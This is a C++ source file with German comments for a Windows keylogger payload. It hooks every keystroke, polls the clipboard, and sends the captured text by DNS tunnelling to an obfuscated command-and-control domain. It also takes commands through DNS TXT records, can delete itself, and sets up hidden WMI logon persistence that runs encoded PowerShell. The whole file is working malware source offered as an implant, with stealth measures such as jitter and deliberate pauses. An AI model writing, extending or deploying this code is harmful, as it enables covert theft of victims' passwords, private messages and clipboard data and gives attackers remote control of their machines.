#include "logger.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <random>
#include <stdexcept>
#include <chrono>
#include <sstream>
#include <iomanip> // Für std::setw und std::setfill
#include <shlobj.h> // Für SHGetFolderPathW
#include <fstream> // Für wofstream
#include <wbemidl.h> // NEU: Für WMI
#include <comdef.h>  // NEU: Für COM-Helfer wie _bstr_t
#include <codecvt> // NEU für String-Konvertierungen
#include <locale>  // NEU für String-Konvertierungen

#pragma comment(lib, "wbemuuid.lib") // NEU: Linker-Anweisung für WMI

// Globaler Payload-Einstiegspunkt
DWORD WINAPI PayloadEntry(LPVOID lpParameter) {
    if (!lpParameter) {
        return 1; // Exit if no parameter is passed
    }
    
    // Der lpParameter ist ein Zeiger auf den Pfad des Droppers
    const wchar_t* dropperPath = static_cast<const wchar_t*>(lpParameter);

    try {
        Logger::instance = new Logger(dropperPath);
        Logger::instance->run(); // Diese Funktion blockiert und enthält die Message-Loop
    } catch (const std::runtime_error&) {
        // Ignoriere Fehler und beende den Thread leise
    }

    // Aufräumen, falls run() jemals zurückkehrt (z.B. durch PostQuitMessage)
    if (Logger::instance) {
        delete Logger::instance;
        Logger::instance = nullptr;
    }

    return 0;
}

// Statische Member initialisieren
HHOOK Logger::keyboardHook = NULL;
Logger* Logger::instance = nullptr;

// NEU: Implementierung des Konstruktors
Logger::Logger(const wchar_t* dropperPath) 
    : dropperPath_(dropperPath), baseInterval(BASE_INTERVAL), jitter(JITTER), lastClipboardContent("") {
    // Der Konstruktor initialisiert die Member-Variablen
}

// NEU: Implementierung des Destruktors
Logger::~Logger() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
    }
    WSACleanup();
}

// Helper-Funktion zum Kodieren von Daten für DNS
std::string toHex(const std::string& input) {
    std::stringstream ss;
    for (unsigned char c : input) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)c;
    }
    return ss.str();
}

// Helper-Funktion zum Generieren einer zufälligen Hex-Zeichenkette
std::string generateSessionId(size_t len) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, 255);
    std::stringstream ss;
    for (size_t i = 0; i < len; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << distrib(gen);
    }
    return ss.str().substr(0, len);
}

void Logger::run() {
    instance = this;
    baseInterval.store(BASE_INTERVAL);
    jitter.store(JITTER);

    // Initialisiere Winsock einmal zentral
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("WSAStartup failed.");
    }

    // Starte den Exfiltrations-Thread
    std::thread exfil(&Logger::exfiltrationThread, this);
    exfil.detach();

    // Starte den C2-Thread
    std::thread c2(&Logger::commandAndControlThread, this);
    c2.detach();

    // NEU: Starte den Clipboard-Logging-Thread
    std::thread clipboard(&Logger::clipboardLoggingThread, this);
    clipboard.detach();

    // Setze den globalen Keyboard-Hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!keyboardHook) {
        throw std::runtime_error("Failed to install keyboard hook.");
    }

    // Windows-Nachrichtenschleife, um den Hook am Leben zu halten
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

LRESULT CALLBACK Logger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pkb = (KBDLLHOOKSTRUCT*)lParam;
            if (instance) {
                instance->processKeystroke(pkb->vkCode);
            }
        }
    }
    // Wichtig: Den Hook an das nächste Glied in der Kette weitergeben
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void Logger::processKeystroke(DWORD vkCode) {
    std::lock_guard<std::mutex> lock(bufferMutex);
    keystrokeBuffer.push_back(vkCodeToString(vkCode));
}

void Logger::exfiltrationThread() {
    std::random_device rd;
    std::mt19937 gen(rd());
    
    while (true) {
        std::uniform_int_distribution<> distrib(-jitter.load(), jitter.load());
        int sleepTime = baseInterval.load() + distrib(gen);
        std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
        
        std::vector<std::string> tempBuffer;
        {
            std::lock_guard<std::mutex> lock(bufferMutex);
            if (keystrokeBuffer.empty()) {
                continue;
            }
            tempBuffer.swap(keystrokeBuffer);
        }

        std::string data;
        for (const auto& key : tempBuffer) {
            data += key;
        }
        
        sendDataViaDNS(data);
    }
    
    // Cleanup wird im Destruktor erledigt
}

void Logger::commandAndControlThread() {
    while(true) {
        // Warte ein variables, aber längeres Intervall, um nach Befehlen zu fragen
        std::this_thread::sleep_for(std::chrono::seconds(baseInterval.load() / 2));

        std::string session_id = generateSessionId(8);
        std::string c2_domain = c2_domain_obf.decrypt(); // Entschlüsseln
        std::string query_name = "cmd." + session_id + "." + c2_domain;

        DNS_RECORD* pDnsRecord;
        std::string command_from_server = "";

        // Führe eine DNS-Anfrage für TXT-Records durch
        DNS_STATUS dnsStatus = DnsQuery_A(
            query_name.c_str(),     // Der Name, der abgefragt werden soll
            DNS_TYPE_TEXT,          // Typ der Abfrage (TXT)
            DNS_QUERY_STANDARD,     // Standardabfrage
            NULL,                   // DNS-Server (NULL für Standard)
            &pDnsRecord,            // Zeiger zum Empfangen der Ergebnisse
            NULL                    // Reserviert
        );

        if (dnsStatus == DNS_SUCCESS && pDnsRecord) {
            // Iteriere durch die DNS-Records (obwohl wir nur einen erwarten)
            DNS_RECORD* pCurrent = pDnsRecord;
            while(pCurrent) {
                if (pCurrent->wType == DNS_TYPE_TEXT) {
                    // Die Daten sind auf mehrere Strings verteilt, wir verketten sie.
                    for (DWORD i = 0; i < pCurrent->Data.TXT.dwStringCount; ++i) {
                        command_from_server += pCurrent->Data.TXT.pStringArray[i];
                    }
                    // Wir nehmen nur den ersten TXT-Record
                    break; 
                }
                pCurrent = pCurrent->pNext;
            }
            // Gib den von DnsQuery alloziierten Speicher frei
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
        
        if (!command_from_server.empty()) {
            handleCommand(command_from_server);
        }
    }
}

void Logger::handleCommand(const std::string& command) {
    std::vector<std::string> parts;
    std::stringstream ss(command);
    std::string item;
    while (std::getline(ss, item, ':')) {
        parts.push_back(item);
    }

    if (parts.empty()) return;

    if (parts[0] == "CMD") {
        if (parts.size() < 2) return;
        try {
            if (parts[1] == "SET_JITTER" && parts.size() >= 3) {
                int new_jitter = std::stoi(parts[2]);
                jitter.store(new_jitter);
            } else if (parts[1] == "SET_INTERVAL" && parts.size() >= 3) {
                int new_interval = std::stoi(parts[2]);
                baseInterval.store(new_interval);
            } else if (parts[1] == "SELF_DESTRUCT") {
                // 1. Erstelle den Pfad für das Batch-Skript im Temp-Verzeichnis
                wchar_t tempPath[MAX_PATH];
                GetTempPathW(MAX_PATH, tempPath);
                
                wchar_t scriptPath[MAX_PATH];
                swprintf_s(scriptPath, MAX_PATH, L"%s\\cleanup_%d.bat", tempPath, generateSessionId(4));

                // 2. Erstelle das Batch-Skript
                std::wofstream scriptFile(scriptPath);
                if (scriptFile.is_open()) {
                    scriptFile << L"@echo off\n";
                    scriptFile << L"timeout /t 5 /nobreak > NUL\n"; // Warte 5s, bis der Host-Prozess beendet ist
                    scriptFile << L"del /F /Q \"" << dropperPath_ << L"\"\n"; // Lösche den Dropper
                    scriptFile << L"(goto) 2>nul & del \"%~f0\""; // Lösche das Skript selbst
                    scriptFile.close();

                    // 3. Führe das Skript aus
                    STARTUPINFOW si = { sizeof(si) };
                    PROCESS_INFORMATION pi;
                    if (CreateProcessW(NULL, scriptPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
                
                // 4. Beende den aktuellen Prozess
                ExitProcess(0);
            }
        } catch (const std::invalid_argument& ia) {
            // Ungültiger Befehl, ignoriere
        } catch (const std::out_of_range& oor) {
            // Ungültiger Befehl, ignoriere
        }
    } else if (parts[0] == "PERSIST") { // NEU: Weiche für Persistenz-Befehle
        handlePersistCommand(parts);
    }
}

// NEU: Implementierung der Persistenz-Befehlslogik
void Logger::handlePersistCommand(const std::vector<std::string>& parts) {
    if (parts.size() < 2) return;

    if (parts[1] == "ENABLE" && parts.size() >= 3 && parts[2] == "WMI") {
        persistEnableWMI();
    } else if (parts[1] == "DISABLE") {
        persistDisableWMI();
    }
}

// Base64-Kodierungsfunktion als Helfer
std::string base64_encode(const std::vector<unsigned char>& in) {
    std::string out;
    const std::string b64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(b64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(b64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

bool Logger::persistEnableWMI() {
    HRESULT hres;

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return false;

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) {
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    // 1. Daten in die Registry schreiben
    // Dummy-Shellcode - in der echten Implementierung wäre das der Logger-Shellcode selbst
    std::vector<unsigned char> shellcode_to_persist = { 0xDE, 0xAD, 0xBE, 0xEF }; 
    std::string encoded_shellcode = base64_encode(shellcode_to_persist);

    const char* reg_path = "Software\\Classes\\MediaShortcuts";
    HKEY hKey;
    RegCreateKeyA(HKEY_CURRENT_USER, reg_path, &hKey);
    RegSetValueExA(hKey, "Content", 0, REG_SZ, (const BYTE*)encoded_shellcode.c_str(), encoded_shellcode.size() + 1);

    std::string vbscript = "Set obj = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").Methods_(\"Create\").inParameters.SpawnInstance_()\r\n"
                           "obj.CommandLine = \"powershell.exe -nop -w hidden -e " + encoded_shellcode + "\"\r\n"
                           "GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").ExecMethod_ \"Create\", obj";
    RegSetValueExA(hKey, "Script", 0, REG_SZ, (const BYTE*)vbscript.c_str(), vbscript.size() + 1);
    RegCloseKey(hKey);

    // 2. Erstelle Event Filter
    IWbemClassObject* pFilterClass = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    IWbemClassObject* pFilterInst = NULL;
    hres = pFilterClass->SpawnInstance(0, &pFilterInst);
    
    VARIANT varFilter;
    varFilter.vt = VT_BSTR;
    varFilter.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'");
    pFilterInst->Put(L"Query", 0, &varFilter, 0);
    pFilterInst->Put(L"QueryLanguage", 0, &_variant_t(L"WQL"), 0);
    pFilterInst->Put(L"Name", 0, &_variant_t(L"PhantomLogonFilter"), 0);
    hres = pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // 3. Erstelle Consumer
    IWbemClassObject* pConsumerClass = NULL;
    hres = pSvc->GetObject(_bstr_t(L"ActiveScriptEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInst = NULL;
    hres = pConsumerClass->SpawnInstance(0, &pConsumerInst);
    
    VARIANT varConsumer;
    varConsumer.vt = VT_BSTR;
    varConsumer.bstrVal = _bstr_t(L"VBScript");
    pConsumerInst->Put(L"ScriptingEngine", 0, &varConsumer, 0);
    
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
    std::wstring w_vbscript = converter.from_bytes(vbscript);
    pConsumerInst->Put(L"ScriptText", 0, &_variant_t(w_vbscript.c_str()), 0);
    pConsumerInst->Put(L"Name", 0, &_variant_t(L"PhantomVBSConsumer"), 0);
    hres = pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // 4. Erstelle Binding
    IWbemClassObject* pBindingClass = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInst = NULL;
    hres = pBindingClass->SpawnInstance(0, &pBindingInst);

    pBindingInst->Put(L"Filter", 0, &_variant_t(L"__EventFilter.Name=\"PhantomLogonFilter\""), 0);
    pBindingInst->Put(L"Consumer", 0, &_variant_t(L"ActiveScriptEventConsumer.Name=\"PhantomVBSConsumer\""), 0);
    hres = pSvc->PutInstance(pBindingInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // Cleanup
    if(pFilterInst) pFilterInst->Release();
    if(pFilterClass) pFilterClass->Release();
    if(pConsumerInst) pConsumerInst->Release();
    if(pConsumerClass) pConsumerClass->Release();
    if(pBindingInst) pBindingInst->Release();
    if(pBindingClass) pBindingClass->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return SUCCEEDED(hres);
}

bool Logger::persistDisableWMI() {
    HRESULT hres;

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return false;

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) {
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    // Pfade zu den WMI-Objekten, die wir löschen wollen
    std::wstring bindingPath = L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"PhantomLogonFilter\\\"\",Consumer=\"ActiveScriptEventConsumer.Name=\\\"PhantomVBSConsumer\\\"\"";
    std::wstring consumerPath = L"ActiveScriptEventConsumer.Name=\"PhantomVBSConsumer\"";
    std::wstring filterPath = L"__EventFilter.Name=\"PhantomLogonFilter\"";

    // Lösche in der richtigen Reihenfolge: Binding -> Consumer -> Filter
    hres = pSvc->DeleteInstance(_bstr_t(bindingPath.c_str()), 0, NULL, NULL);
    hres = pSvc->DeleteInstance(_bstr_t(consumerPath.c_str()), 0, NULL, NULL);
    hres = pSvc->DeleteInstance(_bstr_t(filterPath.c_str()), 0, NULL, NULL);

    // 2. Lösche die Registry-Einträge
    const char* reg_path = "Software\\Classes\\MediaShortcuts";
    RegDeleteKeyA(HKEY_CURRENT_USER, reg_path);

    // Cleanup
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return SUCCEEDED(hres);
}

void Logger::sendDataViaDNS(const std::string& data) {
    std::string hexData = toHex(data);
    size_t chunk_size = 60;
    
    // Session ID für diesen Sendevorgang
    std::string session_id = generateSessionId(8);
    std::string c2_domain = c2_domain_obf.decrypt(); // Entschlüsseln

    for (size_t i = 0; i < hexData.length(); i += chunk_size) {
        std::string chunk = hexData.substr(i, chunk_size);
        std::string domain = chunk + "." + session_id + "." + c2_domain;
        
        // Führe eine DNS-Anfrage durch. Wir ignorieren das Ergebnis.
        // Die Anfrage selbst ist die Exfiltration.
        addrinfo hints = {};
        hints.ai_family = AF_INET;
        addrinfo* result;
        
        getaddrinfo(domain.c_str(), NULL, &hints, &result);
        if(result != NULL){
            freeaddrinfo(result);
        }

        // Kurze Pause, um nicht verdächtig zu wirken
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}

std::string Logger::vkCodeToString(DWORD vkCode) {
    // Vereinfachte Konvertierung. Eine vollständige Implementierung wäre ein State-Machine,
    // die Shift/Ctrl/Alt berücksichtigt. Für die reine Datenexfiltration ist dies ausreichend.
    switch (vkCode) {
        case VK_BACK: return "[BS]";
        case VK_TAB: return "[TAB]";
        case VK_RETURN: return "[ENT]";
        case VK_SHIFT: return "[SHFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_SPACE: return " ";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RGT]";
        case VK_DOWN: return "[DWN]";
        case VK_DELETE: return "[DEL]";
        // OEM Keys for symbols etc.
        case 0x30: return "0"; case 0x31: return "1"; case 0x32: return "2";
        case 0x33: return "3"; case 0x34: return "4"; case 0x35: return "5";
        case 0x36: return "6"; case 0x37: return "7"; case 0x38: return "8";
        case 0x39: return "9";
        case 0x41: return "a"; case 0x42: return "b"; case 0x43: return "c";
        case 0x44: return "d"; case 0x45: return "e"; case 0x46: return "f";
        case 0x47: return "g"; case 0x48: return "h"; case 0x49: return "i";
        case 0x4A: return "j"; case 0x4B: return "k"; case 0x4C: return "l";
        case 0x4D: return "m"; case 0x4E: return "n"; case 0x4F: return "o";
        case 0x50: return "p"; case 0x51: return "q"; case 0x52: return "r";
        case 0x53: return "s"; case 0x54: return "t"; case 0x55: return "u";
        case 0x56: return "v"; case 0x57: return "w"; case 0x58: return "x";
        case 0x59: return "y"; case 0x5A: return "z";
        case VK_OEM_1:      return ";:";
        case VK_OEM_PLUS:   return "+=";
        case VK_OEM_COMMA:  return ",<";
        case VK_OEM_MINUS:  return "-_";
        case VK_OEM_PERIOD: return ".>";
        case VK_OEM_2:      return "/?";
        case VK_OEM_3:      return "`~";
        case VK_OEM_4:      return "[{";
        case VK_OEM_5:      return "\\|";
        case VK_OEM_6:      return "]}";
        case VK_OEM_7:      return "'\"";
        default: return "[?]";
    }
}

void Logger::clipboardLoggingThread() {
    while (true) {
        // Prüfe die Zwischenablage alle 2 Sekunden.
        std::this_thread::sleep_for(std::chrono::seconds(2));

        if (!IsClipboardFormatAvailable(CF_TEXT)) {
            continue;
        }

        if (!OpenClipboard(NULL)) {
            continue;
        }

        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == NULL) {
            CloseClipboard();
            continue;
        }

        char* pszText = static_cast<char*>(GlobalLock(hData));
        if (pszText == NULL) {
            CloseClipboard();
            continue;
        }

        std::string currentClipboardContent(pszText);
        GlobalUnlock(hData);
        CloseClipboard();

        // Vergleiche mit dem letzten Inhalt und logge nur bei Änderungen.
        std::lock_guard<std::mutex> lock(bufferMutex);
        if (!currentClipboardContent.empty() && currentClipboardContent != lastClipboardContent) {
            lastClipboardContent = currentClipboardContent;
            // Füge einen klaren Indikator hinzu
            keystrokeBuffer.push_back("\n[CLIPBOARD_START]\n" + currentClipboardContent + "\n[CLIPBOARD_END]\n");
        }
    }
} 